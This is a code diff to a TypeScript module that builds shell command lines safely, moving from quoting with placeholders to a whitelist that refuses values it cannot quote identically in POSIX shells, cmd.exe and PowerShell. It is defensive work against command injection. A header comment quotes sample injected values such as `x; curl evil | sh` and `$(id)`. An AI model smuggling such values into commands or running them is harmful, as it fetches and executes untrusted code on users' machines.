@@ -2,55 +2,59 @@
 //
 // A name, a path, a source or an id in such a line comes from a package, a skill, a lock or a config that somebody
 // else wrote, so it must never become a second command when it is pasted: `x; curl evil | sh`, `$(id)`, a backtick,
-// a quote, a newline, `&`, `%PATH%`, `^`. Every printed command is built here, from words Stroq wrote (trusted) and
-// values from outside, and the rules are these:
+// a quote, a newline, `&`, `%PATH%`, `^`. Shells differ in what they do with a quote (fish reads a backslash inside
+// single quotes, csh and tcsh expand `!` inside them, `$'...'` is not POSIX), so there is no clever quoting here. It
+// is a whitelist, and what is not on it is not printed as a command at all:
 //
-// - A value is one argument. On a POSIX shell it is put between single quotes, the only quoting in which nothing is
-//   expanded, with a quote in it written as `'\''`. On Windows (cmd.exe and PowerShell both) it is put between double
-//   quotes when nothing in it is expanded there; a value with `"`, `%`, `^`, `!`, `$` or a backtick in it is not
-//   quoted at all but replaced by a placeholder, because no one quoting is safe in both shells.
-// - A value that cannot be shown (a control character, a newline, NUL, a character that is invisible or reverses the
-//   text, a lone surrogate) or that is longer than a path can be is replaced by a placeholder such as
-//   `<unprintable-name>`. The placeholder is not a command to run: the person is meant to find the real value, and a
-//   line pasted with it in does nothing harmful (a shell reads `<unprintable-name` as a redirection from a file).
-// - A positional value that starts with `-` would be read as an option, so such a line puts `--` before the
-//   positionals, and an option's value that starts with `-` is written `--flag=value`.
-//
-// The terminal control characters of a value are therefore never printed, either.
+// - POSIX shells. A value is written bare only if every character is one of `A-Za-z0-9_@%+=:,./-` and it does not
+//   begin with `-`, `=` or `%` (an option, zsh's `=cmd`, fish's `%self`). Otherwise it is written between single
+//   quotes, but only if it has no `'`, no backslash, no `!`, no control character (newline, NUL and DEL among them),
+//   no U+2028, U+2029 or U+0085, and no character that is invisible, reverses the text or is a lone surrogate. Any other
+//   value (and any longer than 4096 characters) is not quoted: see below.
+// - Windows (cmd.exe and PowerShell). A value is written bare on the same terms (it may also hold a backslash), or
+//   between double quotes if it has no `"`, `%`, `^`, `!`, `&`, `|`, `<`, `>`, backtick or `$`, no control or hidden
+//   character, and does not end with a backslash. Nothing else is printed as a command. The lines are for cmd.exe
+//   and PowerShell; no other shell on Windows is quoted for.
+// - A value that cannot be written that way makes the whole line a plain sentence that says so, in letters, spaces,
+//   commas and periods only, so that nothing in it means anything to a shell. There is no placeholder inside a command
+//   line: a placeholder is text, and `<` and `>` are redirections.
+// - A positional that begins with `-` would be read as an option, so the line puts `--` before every positional, and
+//   an option's value that begins with `-` is written `--flag=value`.
 
-/** What a value is, for the placeholder that takes its place. */
+/** What a value is, for the sentence that says it cannot be printed. */
 export type Kind = 'name' | 'path' | 'source' | 'id' | 'value';
 
-/** The most a value may have before it is replaced: longer than any path, so a hostile one cannot flood a line. */
+/** The most a value may have before it is not printed: longer than any path, so a hostile one cannot flood a line. */
 const MAX_UNITS = 4096;
 
-/** Characters that cannot be shown as they are: controls, what shows nothing or changes what is shown, lone surrogates. */
+/** Characters that cannot be shown as they are: controls (DEL and U+0085 too), what shows nothing or changes what is shown. */
 const UNSHOWABLE = /[\p{Cc}\p{Cf}\p{Cs}\p{Zl}\p{Zp}\p{Default_Ignorable_Code_Point}]/u;
-/** Characters that a POSIX shell reads as themselves anywhere in a word (no `~`, which expands at the start). */
-const PLAIN_POSIX = /^[A-Za-z0-9_@%+=:,./-]+$/;
-/** Characters that cmd.exe or PowerShell would act on even between double quotes. */
-const EXPANDED_ON_WINDOWS = /["%^!$`]/;
-const PLAIN_WINDOWS = /^[A-Za-z0-9_@+=:,./\\-]+$/;
+/** A word of a POSIX shell that is not quoted: nothing in it means anything to a shell, and it is not an option. */
+const BARE_POSIX = /^[A-Za-z0-9_@+:,./][A-Za-z0-9_@%+=:,./-]*$/;
+/** The same for Windows, where a backslash is a path separator. */
+const BARE_WINDOWS = /^[A-Za-z0-9_@+:,./\\][A-Za-z0-9_@+=:,./\\-]*$/;
+/** What a POSIX single quote cannot hold in every shell: the quote, a backslash (fish) and `!` (csh, tcsh). */
+const NOT_IN_SINGLE_QUOTES = /['\\!]/;
+/** What cmd.exe or PowerShell acts on even between double quotes (or that ends the quote). */
+const NOT_IN_DOUBLE_QUOTES = /["%^!&|<>`$]/;
 
-const placeholder = (what: Kind, why: 'unprintable' | 'long'): string =>
-  why === 'long' ? `<${what}-too-long>` : `<unprintable-${what}>`;
-
-/** One value as one word of a command line, or a placeholder when it cannot be made one safely. */
+/**
+ * One value as one word of a command line, or null when it cannot be written as one on this platform in a way that
+ * is the same in every shell the line may be pasted into. The words are never altered; a value is whole or absent.
+ */
 export function quoteWord(
   value: string,
-  what: Kind = 'value',
   platform: NodeJS.Platform = process.platform,
   forbid = '',
-): string {
-  if (value.length > MAX_UNITS) return placeholder(what, 'long');
-  if (UNSHOWABLE.test(value) || [...forbid].some((char) => value.includes(char)))
-    return placeholder(what, 'unprintable');
-  if (platform !== 'win32')
-    return PLAIN_POSIX.test(value) ? value : `'${value.replaceAll("'", `'\\''`)}'`;
-  if (PLAIN_WINDOWS.test(value)) return value;
-  if (EXPANDED_ON_WINDOWS.test(value)) return placeholder(what, 'unprintable');
-  // A backslash before the closing quote would escape it for the program that reads the line.
-  return `"${value}${/\\+$/.exec(value)?.[0] ?? ''}"`;
+): string | null {
+  if (value.length > MAX_UNITS || UNSHOWABLE.test(value)) return null;
+  if ([...forbid].some((char) => value.includes(char))) return null;
+  if (platform !== 'win32') {
+    if (BARE_POSIX.test(value)) return value;
+    return NOT_IN_SINGLE_QUOTES.test(value) ? null : `'${value}'`;
+  }
+  if (BARE_WINDOWS.test(value)) return value;
+  return NOT_IN_DOUBLE_QUOTES.test(value) || value.endsWith('\\') ? null : `"${value}"`;
 }
 
 /** What a piece of a command line is. A string is a word that Stroq wrote; the others are values from outside. */
@@ -65,37 +69,65 @@ export type Piece =
 
 export interface LineOptions {
   readonly platform?: NodeJS.Platform;
-  /** Characters that make a value a placeholder, for a line that goes into text where they mean something (a backtick in Markdown). */
+  /** Characters that make a value unprintable, for a line that goes into text where they mean something (a backtick in Markdown). */
   readonly forbid?: string;
 }
 
 /** The place of a positional in the words of a line, until it is known whether they all stay where they are. */
 const HOLE = Symbol('positional');
 
-/** The command line of the pieces, with every value quoted, in the order given. */
-export function commandLine(pieces: readonly Piece[], options: LineOptions = {}): string {
+/**
+ * The command line of the pieces with every value quoted, in the order given, or null when a value cannot be printed
+ * safely; `unprintable` then names what kind of value it was.
+ */
+export function tryCommandLine(
+  pieces: readonly Piece[],
+  options: LineOptions = {},
+): { readonly line: string } | { readonly line: null; readonly unprintable: Kind } {
   const { platform = process.platform, forbid = '' } = options;
-  const quote = (value: string, what: Kind | undefined): string =>
-    quoteWord(value, what, platform, forbid);
   const words: (string | typeof HOLE)[] = [];
   const positionals: string[] = [];
   let leadingDash = false;
+  const unprintable = (what: Kind | undefined) =>
+    ({ line: null, unprintable: what ?? 'value' }) as const;
   for (const piece of pieces) {
-    if (typeof piece === 'string') words.push(piece);
-    else if ('flag' in piece) {
-      const word = quote(piece.value, piece.what);
-      if (piece.value.startsWith('-')) words.push(`${piece.flag}=${word}`);
+    if (typeof piece === 'string') {
+      words.push(piece);
+      continue;
+    }
+    const value = 'flag' in piece ? piece.value : 'word' in piece ? piece.word : piece.positional;
+    const word = quoteWord(value, platform, forbid);
+    if (word === null) return unprintable(piece.what);
+    if ('flag' in piece) {
+      if (value.startsWith('-')) words.push(`${piece.flag}=${word}`);
       else words.push(piece.flag, word);
-    } else if ('word' in piece) words.push(quote(piece.word, piece.what));
+    } else if ('word' in piece) words.push(word);
     else {
-      leadingDash ||= piece.positional.startsWith('-');
-      positionals.push(quote(piece.positional, piece.what));
+      leadingDash ||= value.startsWith('-');
+      positionals.push(word);
       words.push(HOLE);
     }
   }
   // A positional stays where it was written, unless one starts with `-`: then all of them go after `--`.
   if (leadingDash)
-    return [...words.filter((word) => word !== HOLE), '--', ...positionals].join(' ');
+    return { line: [...words.filter((word) => word !== HOLE), '--', ...positionals].join(' ') };
   let next = 0;
-  return words.map((word) => (word === HOLE ? positionals[next++]! : word)).join(' ');
+  return { line: words.map((word) => (word === HOLE ? positionals[next++]! : word)).join(' ') };
+}
+
+/** What a person is told in place of a command that cannot be printed safely: letters, spaces, commas and periods. */
+export function unprintableSentence(what: Kind = 'value'): string {
+  const hint =
+    what === 'name'
+      ? ', and stroq doctor lists the installed names'
+      : what === 'id'
+        ? ', and stroq log lists the sessions'
+        : '';
+  return `the ${what} has characters that cannot be quoted safely for a shell, so no command is shown${hint}`;
+}
+
+/** The command line of the pieces, or the sentence that says why there is none. */
+export function commandLine(pieces: readonly Piece[], options: LineOptions = {}): string {
+  const result = tryCommandLine(pieces, options);
+  return result.line ?? unprintableSentence(result.unprintable);
 }
